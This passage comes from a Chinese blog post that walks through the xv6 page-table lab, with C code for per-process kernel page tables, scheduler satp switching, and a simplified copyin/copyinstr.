kpgtable</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Per-process state</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> &#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spinlock</span> <span class="hljs-title">lock</span>;</span><br><br>  <span class="hljs-comment">// p-&gt;lock must be held when using these:</span><br>  <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">procstate</span> <span class="hljs-title">state</span>;</span>        <span class="hljs-comment">// Process state</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">parent</span>;</span>         <span class="hljs-comment">// Parent process</span><br>  <span class="hljs-keyword">void</span> *chan;                  <span class="hljs-comment">// If non-zero, sleeping on chan</span><br>  <span class="hljs-keyword">int</span> killed;                  <span class="hljs-comment">// If non-zero, have been killed</span><br>  <span class="hljs-keyword">int</span> xstate;                  <span class="hljs-comment">// Exit status to be returned to parent&#x27;s wait</span><br>  <span class="hljs-keyword">int</span> pid;                     <span class="hljs-comment">// Process ID</span><br><br>  <span class="hljs-comment">// these are private to the process, so p-&gt;lock need not be held.</span><br>  uint64 kstack;               <span class="hljs-comment">// Virtual address of kernel stack</span><br>  uint64 sz;                   <span class="hljs-comment">// Size of process memory (bytes)</span><br>  <span class="hljs-keyword">pagetable_t</span> pagetable;       <span class="hljs-comment">// User page table</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">trapframe</span>;</span> <span class="hljs-comment">// data page for trampoline.S</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">context</span> <span class="hljs-title">context</span>;</span>      <span class="hljs-comment">// swtch() here to run process</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">ofile</span>[<span class="hljs-title">NOFILE</span>];</span>  <span class="hljs-comment">// Open files</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">cwd</span>;</span>           <span class="hljs-comment">// Current directory</span><br>  <span class="hljs-keyword">char</span> name[<span class="hljs-number">16</span>];               <span class="hljs-comment">// Process name (debugging)</span><br>  <span class="hljs-keyword">pagetable_t</span> kpgtable;        <span class="hljs-comment">// Kernel page table</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>后面要用的几个重要函数</p><table><thead><tr><th>函数名称</th><th>作用</th></tr></thead><tbody><tr><td>walk</td><td>通过虚拟地址得到 PTE</td></tr><tr><td>mappages</td><td>将虚拟地址映射到物理地址</td></tr><tr><td>copyin</td><td>将用户虚拟地址的数据复制到内核空间地址</td></tr><tr><td>copyout</td><td>将内核数据复制到用户虚拟地址</td></tr><tr><td>kvminit</td><td>创建内核的页表，对全局的<code>kernel_pagetable</code>进行映射</td></tr><tr><td>kvmmap</td><td>调用 mappages，将一个虚拟地址范围映射到一个物理地址范围</td></tr><tr><td>kvminithart</td><td>映射内核页表。它将根页表页的物理地址写入寄存器 satp 中</td></tr><tr><td>procinit</td><td>为每个进程分配一个内核栈</td></tr><tr><td>kalloc</td><td>分配物理页</td></tr><tr><td>proc_pagetable(struct proc *<em>p</em>)</td><td>为给定的进程创建用户态页表</td></tr><tr><td>kvminithart</td><td>映射内核页表。它将根页表页的物理地址写入寄存器 satp 中</td></tr></tbody></table><p>相关函数调用链：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xl">main <br><span class="hljs-function"><span class="hljs-title">kvminit</span> -&gt;</span> kvmmap<br>procinit<br><span class="hljs-function"><span class="hljs-title">userinit</span> -&gt;</span> allocproc<br></code></pre></td></tr></table></figure><p>之后，我们要对进程的内核页表进行初始化</p><p>参考kvminit函数和kvmmap函数，这两个函数用来添加对全局kernel_pagetable的映射</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * create a direct-map page table for the kernel.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">kvminit</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  kernel_pagetable = (<span class="hljs-keyword">pagetable_t</span>) kalloc();<br>  <span class="hljs-built_in">memset</span>(kernel_pagetable, <span class="hljs-number">0</span>, PGSIZE);<br><br>  <span class="hljs-comment">// uart registers</span><br>  kvmmap(UART0, UART0, PGSIZE, PTE_R | PTE_W);<br><br>  <span class="hljs-comment">// virtio mmio disk interface</span><br>  kvmmap(VIRTIO0, VIRTIO0, PGSIZE, PTE_R | PTE_W);<br><br>  <span class="hljs-comment">// CLINT</span><br>  kvmmap(CLINT, CLINT, <span class="hljs-number">0x10000</span>, PTE_R | PTE_W);<br><br>  <span class="hljs-comment">// PLIC</span><br>  kvmmap(PLIC, PLIC, <span class="hljs-number">0x400000</span>, PTE_R | PTE_W);<br><br>  <span class="hljs-comment">// map kernel text executable and read-only.</span><br>  kvmmap(KERNBASE, KERNBASE, (uint64)etext-KERNBASE, PTE_R | PTE_X);<br><br>  <span class="hljs-comment">// map kernel data and the physical RAM we&#x27;ll make use of.</span><br>  kvmmap((uint64)etext, (uint64)etext, PHYSTOP-(uint64)etext, PTE_R | PTE_W);<br><br>  <span class="hljs-comment">// map the trampoline for trap entry/exit to</span><br>  <span class="hljs-comment">// the highest virtual address in the kernel.</span><br>  kvmmap(TRAMPOLINE, (uint64)trampoline, PGSIZE, PTE_R | PTE_X);<br>&#125;<br><br><span class="hljs-comment">// add a mapping to the kernel page table.</span><br><span class="hljs-comment">// only used when booting.</span><br><span class="hljs-comment">// does not flush TLB or enable paging.</span><br><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">kvmmap</span><span class="hljs-params">(uint64 va, uint64 pa, uint64 sz, <span class="hljs-keyword">int</span> perm)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">if</span>(mappages(kernel_pagetable, va, sz, pa, perm) != <span class="hljs-number">0</span>)<br>    panic(<span class="hljs-string">&quot;kvmmap&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>类似的，我们创建ukvmmap和ukvminit这两个函数，完成对进程结构体中的内核页表的映射</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">ukvmmap</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> kpgtable,uint64 va, uint64 pa, uint64 sz, <span class="hljs-keyword">int</span> perm)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">if</span>(mappages(kpgtable, va, sz, pa, perm) != <span class="hljs-number">0</span>)<br>    panic(<span class="hljs-string">&quot;ukvmmap&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">pagetable_t</span></span><br><span class="hljs-function"><span class="hljs-title">ukvminit</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">pagetable_t</span> kpgtable=(<span class="hljs-keyword">pagetable_t</span>) kalloc();<br>  <span class="hljs-built_in">memset</span>(kpgtable, <span class="hljs-number">0</span>, PGSIZE);<br>  ukvmmap(kpgtable, UART0, UART0, PGSIZE, PTE_R | PTE_W);<br>  ukvmmap(kpgtable, VIRTIO0, VIRTIO0, PGSIZE, PTE_R | PTE_W);<br>  ukvmmap(kpgtable, CLINT, CLINT, <span class="hljs-number">0x10000</span>, PTE_R | PTE_W);<br>  ukvmmap(kpgtable, PLIC, PLIC, <span class="hljs-number">0x400000</span>, PTE_R | PTE_W);<br>  ukvmmap(kpgtable, KERNBASE, KERNBASE, (uint64)etext-KERNBASE, PTE_R | PTE_X);<br>  ukvmmap(kpgtable, (uint64)etext, (uint64)etext, PHYSTOP-(uint64)etext, PTE_R | PTE_W);<br>  ukvmmap(kpgtable, TRAMPOLINE, (uint64)trampoline, PGSIZE, PTE_R | PTE_X);<br>  <span class="hljs-keyword">return</span> kpgtable;<br>&#125;<br></code></pre></td></tr></table></figure><p>在defs.h中需要添加</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span>            <span class="hljs-title">ukvmmap</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> ,uint64 , uint64 , uint64 , <span class="hljs-keyword">int</span> )</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">pagetable_t</span>     <span class="hljs-title">ukvminit</span><span class="hljs-params">()</span></span>;<br></code></pre></td></tr></table></figure><p>根据前面函数调用的分析，我们可以发现这个main中userinit -&gt; allocproc的调用。allocproc函数返回一个未被利用的进程，并且做初始化工作，比如下面的这一些代码来自allocproc，做了用户页表的初始化工作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// An empty user page table.</span><br>p-&gt;pagetable = proc_pagetable(p);<br><span class="hljs-keyword">if</span>(p-&gt;pagetable == <span class="hljs-number">0</span>)&#123;<br>  freeproc(p);<br>  release(&amp;p-&gt;lock);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>同样的，既然已经在结构体里面加了kpgtable，那么也要给进程的内核态页表做初始化工作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">p-&gt;kpgtable=ukvminit();<br><span class="hljs-keyword">if</span>(p-&gt;kpgtable == <span class="hljs-number">0</span>)&#123;<br>  freeproc(p);<br>  release(&amp;p-&gt;lock);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在procinit函数中，为了给进程初始化内核栈，有这样一段代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Allocate a page for the process&#x27;s kernel stack.</span><br><span class="hljs-comment">// Map it high in memory, followed by an invalid</span><br><span class="hljs-comment">// guard page.</span><br><span class="hljs-keyword">char</span> *pa = kalloc();<br><span class="hljs-keyword">if</span>(pa == <span class="hljs-number">0</span>)<br>  panic(<span class="hljs-string">&quot;kalloc&quot;</span>);<br>uint64 va = KSTACK((<span class="hljs-keyword">int</span>) (p - proc));<br>kvmmap(va, (uint64)pa, PGSIZE, PTE_R | PTE_W);<br>p-&gt;kstack = va;<br></code></pre></td></tr></table></figure><p>类似的，在allocproc函数中，我们需要初始化内核栈并将其映射到进程单独的内核页表，需要加上：（在这之后可以将procinit中初始化内核栈的代码注释掉）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">p-&gt;kpgtable=ukvminit();<br><span class="hljs-keyword">if</span>(p-&gt;kpgtable == <span class="hljs-number">0</span>)&#123;<br>  freeproc(p);<br>  release(&amp;p-&gt;lock);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">char</span> *pa = kalloc();<br><span class="hljs-keyword">if</span>(pa == <span class="hljs-number">0</span>)<br>  panic(<span class="hljs-string">&quot;kalloc&quot;</span>);<br>uint64 va = KSTACK((<span class="hljs-keyword">int</span>) (p - proc));<br>ukvmmap(p-&gt;kpgtable, va, (uint64)pa, PGSIZE, PTE_R | PTE_W);<br>p-&gt;kstack = va;<br></code></pre></td></tr></table></figure><p>freeproc函数，要将进程的内核页表进行清除</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// free a proc structure and the data hanging from it,</span><br><span class="hljs-comment">// including user pages.</span><br><span class="hljs-comment">// p-&gt;lock must be held.</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">freeproc</span><span class="hljs-params">(struct proc *p)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">if</span>(p-&gt;trapframe)<br>    kfree((<span class="hljs-keyword">void</span>*)p-&gt;trapframe);<br>  p-&gt;trapframe = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span>(p-&gt;pagetable)<br>    proc_freepagetable(p-&gt;pagetable, p-&gt;sz);<br>  <span class="hljs-comment">/* add here */</span><br>  <span class="hljs-keyword">if</span> (p-&gt;kstack)<br>  &#123;<br>      <span class="hljs-keyword">pte_t</span>* pte = walk(p-&gt;kpgtable, p-&gt;kstack, <span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">if</span> (pte == <span class="hljs-number">0</span>)<br>          panic(<span class="hljs-string">&quot;freeproc: walk&quot;</span>);<br>      kfree((<span class="hljs-keyword">void</span>*)PTE2PA(*pte));<br>  &#125;<br>  p-&gt;kstack = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-keyword">if</span> (p-&gt;kpgtable)<br>    freewalk_kproc(p-&gt;kpgtable);<br>  <span class="hljs-comment">/* add here */</span><br>  p-&gt;pagetable = <span class="hljs-number">0</span>;<br>  p-&gt;sz = <span class="hljs-number">0</span>;<br>  p-&gt;pid = <span class="hljs-number">0</span>;<br>  p-&gt;parent = <span class="hljs-number">0</span>;<br>  p-&gt;name[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>  p-&gt;chan = <span class="hljs-number">0</span>;<br>  p-&gt;killed = <span class="hljs-number">0</span>;<br>  p-&gt;xstate = <span class="hljs-number">0</span>;<br>  p-&gt;state = UNUSED;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们需要模仿freewalk重新实现freewalk_kproc，使得仅仅解除页表的内存映射而不像freewalk一样清除物理页数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">freewalk_kproc</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> pagetable)</span> </span>&#123;<br>  <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">512</span>; i++)&#123;<br>    <span class="hljs-keyword">pte_t</span> pte = pagetable[i];<br>    <span class="hljs-keyword">if</span>((pte &amp; PTE_V))&#123;<br>      pagetable[i] = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">if</span> ((pte &amp; (PTE_R|PTE_W|PTE_X)) == <span class="hljs-number">0</span>)<br>      &#123;<br>        uint64 child = PTE2PA(pte);<br>        freewalk_kproc((<span class="hljs-keyword">pagetable_t</span>)child);<br>      &#125;<br>    &#125;<br>  &#125;<br>  kfree((<span class="hljs-keyword">void</span>*)pagetable);<br>&#125;<br></code></pre></td></tr></table></figure><p> 在调度程序scheduler中，调度程序之前，我们需要切换到进程自己的内核页表处，并使用sfence.vma刷新当前 CPU 的 TLB</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Per-CPU process scheduler.</span><br><span class="hljs-comment">// Each CPU calls scheduler() after setting itself up.</span><br><span class="hljs-comment">// Scheduler never returns.  It loops, doing:</span><br><span class="hljs-comment">//  - choose a process to run.</span><br><span class="hljs-comment">//  - swtch to start running that process.</span><br><span class="hljs-comment">//  - eventually that process transfers control</span><br><span class="hljs-comment">//    via swtch back to the scheduler.</span><br><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">scheduler</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cpu</span> *<span class="hljs-title">c</span> =</span> mycpu();<br>  <br>  c-&gt;proc = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span>(;;)&#123;<br>    <span class="hljs-comment">// Avoid deadlock by ensuring that devices can interrupt.</span><br>    intr_on();<br>    <br>    <span class="hljs-keyword">int</span> found = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++) &#123;<br>      acquire(&amp;p-&gt;lock);<br>      <span class="hljs-keyword">if</span>(p-&gt;state == RUNNABLE) &#123;<br>        <span class="hljs-comment">// Switch to chosen process.  It is the process&#x27;s job</span><br>        <span class="hljs-comment">// to release its lock and then reacquire it</span><br>        <span class="hljs-comment">// before jumping back to us.</span><br>        p-&gt;state = RUNNING;<br>        c-&gt;proc = p;<br>        <span class="hljs-comment">//切换到进程自己的内核页表处</span><br>        w_satp(MAKE_SATP(p-&gt;kpgtable));<br>        <span class="hljs-comment">//使用sfence.vma刷新当前 CPU 的 TLB</span><br>        sfence_vma();<br>        <span class="hljs-comment">//调度进程</span><br>        swtch(&amp;c-&gt;context, &amp;p-&gt;context);<br>        <span class="hljs-comment">//切换回内核页表</span><br>        kvminithart();<br>        <br>        <span class="hljs-comment">// Process is done running for now.</span><br>        <span class="hljs-comment">// It should have changed its p-&gt;state before coming back.</span><br>        c-&gt;proc = <span class="hljs-number">0</span>;<br><br>        found = <span class="hljs-number">1</span>;<br>      &#125;<br>      release(&amp;p-&gt;lock);<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> !defined (LAB_FS)</span><br>    <span class="hljs-keyword">if</span>(found == <span class="hljs-number">0</span>) &#123;<br>      intr_on();<br>      <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot;wfi&quot;</span>)</span></span>;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>    ;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>给 vm.c 添加头文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;spinlock.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;proc.h&quot;</span><span class="hljs-comment">//如果顺序颠倒会报结构体定义错误</span></span><br></code></pre></td></tr></table></figure><p>修改 <code>kvmpa</code> 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">pte = walk(myproc()-&gt;kpgtable, va, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><h2 id="Simplify-copyin-copyinstr"><a href="#Simplify-copyin-copyinstr" class="headerlink" title="Simplify copyin/copyinstr"></a>Simplify <code>copyin/copyinstr</code></h2><blockquote><p>内核的 copyin 函数读取用户指针指向的内存。它通过将它们转换为物理地址来实现这一点，而内核可以直接取消对它们的引用。它通过在软件中遍历过程页表来执行这种转换。在实验室的这一部分中，您的工作是向每个进程的内核页表(在前一节中创建)添加用户映射，以允许 copyin (以及相关的字符串函数 copinstr)直接取消引用用户指针。</p></blockquote><p>首先声明copyin_new和copyinstr_new</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">copyin_new</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> pagetable, <span class="hljs-keyword">char</span> *dst, uint64 srcva, uint64 len)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">copyinstr_new</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> pagetable, <span class="hljs-keyword">char</span> *dst, uint64 srcva, uint64 max)</span></span>;<br></code></pre></td></tr></table></figure><p>修改copyin函数，使得改为执行copyin_new</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">copyin</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> pagetable, <span class="hljs-keyword">char</span> *dst, uint64 srcva, uint64 len)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> copyin_new(pagetable, dst, srcva, len);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">copyinstr</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> pagetable, <span class="hljs-keyword">char</span> *dst, uint64 srcva, uint64 max)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> copyinstr_new(pagetable, dst, srcva, max);<br>&#125;<br></code></pre></td></tr></table></figure><p>增加一个u2kvmcopy函数，完成页表的复制</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> </span><br><span class="hljs-function"><span class="hljs-title">u2kvmcopy</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> upagetable, <span class="hljs-keyword">pagetable_t</span> kpagetable, uint64 oldsz, uint64 newsz)</span></span><br><span class="hljs-function"></span>&#123;<br>  oldsz = PGROUNDUP(oldsz);<br>  <span class="hljs-keyword">for</span> (uint64 i = oldsz; i &lt; newsz; i += PGSIZE) &#123;<br>    <span class="hljs-keyword">pte_t</span>* pte_from = walk(upagetable, i, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(pte_from == <span class="hljs-number">0</span>) <br>      panic(<span class="hljs-string">&quot;pte_from&quot;</span>);<br>    <span class="hljs-keyword">pte_t</span>* pte_to = walk(kpagetable, i, <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span>(pte_to == <span class="hljs-number">0</span>) <br>      panic(<span class="hljs-string">&quot;pte_to&quot;</span>);<br>    uint64 pa = PTE2PA(*pte_from);<br>    uint flag = (PTE_FLAGS(*pte_from)) &amp; (~PTE_U);<br>    *pte_to = PA2PTE(pa) | flag;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>userinit加上：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">u2kvmcopy(np-&gt;pagetable, np-&gt;kpgtable, <span class="hljs-number">0</span>, np-&gt;sz);<br></code></pre></td></tr></table></figure><p>fork加上：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">u2kvmcopy(np-&gt;pagetable, np-&gt;kpgtable, <span class="hljs-number">0</span>, np-&gt;sz);<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 